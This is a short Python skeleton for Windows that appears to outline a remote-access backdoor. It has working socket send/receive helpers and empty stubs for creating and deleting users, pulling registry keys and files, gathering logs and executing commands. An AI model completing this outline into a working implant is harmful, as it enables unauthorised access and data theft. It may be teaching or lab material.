
import subprocess, socket, time, struct
from _winreg import *

def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return

def create_user(name,pwd):
    return

def delete_user(name):
    return

def download_registry_key(root, path, sock):
    return

def download_file(file_name,sock):
    return
        
def gather_information(log_name,sock):
    return
    
def execute_command(cmd):
    return
    
def get_data(sock, str_to_send):
    return

def main():
    return
    
main()
    
